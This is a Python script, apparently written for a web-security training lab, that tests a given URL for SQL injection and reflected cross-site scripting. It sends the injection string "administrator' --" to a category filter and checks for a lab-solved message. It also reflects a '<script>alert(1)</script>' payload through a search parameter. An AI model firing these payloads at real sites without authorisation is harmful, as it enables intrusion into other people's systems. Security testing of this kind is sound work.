#!/usr/bin/env python3
"""
Advanced Vulnerability Tester

This tool performs automated testing for common web vulnerabilities, 
specifically SQL Injection and Cross‑Site Scripting (XSS). It features robust error handling, 
detailed logging, and a flexible command‑line interface. Designed for real‑world usage,
this tool aids in identifying vulnerabilities in target URLs.

Usage:
    python advanced_vulnerability_tester.py <url> [options]

Example:
    python advanced_vulnerability_tester.py http://example.com -t all -p "<script>alert(1)</script>" -v
"""

import argparse
import logging
import requests
from urllib.parse import quote
from bs4 import BeautifulSoup
from datetime import datetime
import sys

# Configure logging for detailed output.
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def test_sql_injection(url: str) -> None:
    """
    Test for SQL Injection by injecting a payload into a vulnerable parameter.
    The payload "administrator' --" is appended to the endpoint '/filter?category='.
    """
    logging.info("Starting SQL Injection test...")
    endpoint = '/filter?category='
    payload = "administrator' --"
    # Ensure proper URL formation by stripping trailing slash and encoding payload.
    final_url = f"{url.rstrip('/')}{endpoint}{quote(payload)}"
    logging.info(f"SQL Injection Test URL: {final_url}")
    
    try:
        response = requests.get(final_url, timeout=10)
        if response.status_code != 200:
            logging.error(f"HTTP request failed with status code: {response.status_code}")
            return

        # Parse the HTML response.
        soup = BeautifulSoup(response.text, 'html.parser')
        lab_solved_element = soup.find('h4')

        if lab_solved_element:
            lab_solved_text = lab_solved_element.text.strip().lower()
            if 'congratulation' in lab_solved_text:
                logging.info("SQL Injection Successful! Lab is solved. 🎉")
            else:
                logging.info("SQL Injection did not solve the lab.")
        else:
            logging.error("Could not find the expected element in the response.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during SQL Injection test: {e}")


def test_xss(url: str, payload: str) -> None:
    """
    Test for Cross‑Site Scripting (XSS) by injecting a payload into a search parameter.
    The payload is URL‑encoded and appended as the value for the 'search' parameter.
    """
    logging.info("Starting XSS test...")
    encoded_payload = quote(payload)
    final_url = f"{url.rstrip('/')}/?search={encoded_payload}"
    logging.info(f"XSS Test URL: {final_url}")

    try:
        response = requests.get(final_url, timeout=10)
        if response.status_code == 200:
            if payload in response.text:
                logging.info("XSS Payload reflected in the response! Vulnerability confirmed.")
            else:
                logging.info("XSS Payload not reflected.")
        else:
            logging.error(f"Unexpected response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during XSS test: {e}")


def parse_arguments() -> argparse.Namespace:
    """
    Parse command‑line arguments.
    """
    parser = argparse.ArgumentParser(description="Advanced Vulnerability Tester")
    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
    parser.add_argument(
        "-t", "--test",
        choices=["sql", "xss", "all"],
        default="all",
        help="Vulnerability test to run: 'sql' for SQL Injection, 'xss' for XSS, 'all' for both (default)"
    )
    parser.add_argument(
        "-p", "--payload",
        default="<script>alert(1)</script>",
        help="XSS payload to test (only applicable for XSS test)"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    return parser.parse_args()


def main() -> None:
    args = parse_arguments()

    # Validate URL format.
    if not args.url.startswith("http://") and not args.url.startswith("https://"):
        logging.error("Invalid URL format. Ensure it starts with http:// or https://.")
        sys.exit(1)

    # Enable verbose logging if specified.
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    logging.info("Vulnerability test started at %s", start_time)

    # Execute chosen tests.
    if args.test in ["sql", "all"]:
        logging.info("Running SQL Injection test...")
        test_sql_injection(args.url)

    if args.test in ["xss", "all"]:
        logging.info("Running XSS test...")
        test_xss(args.url, args.payload)

    end_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    logging.info("Vulnerability test ended at %s", end_time)


if __name__ == "__main__":
    main()
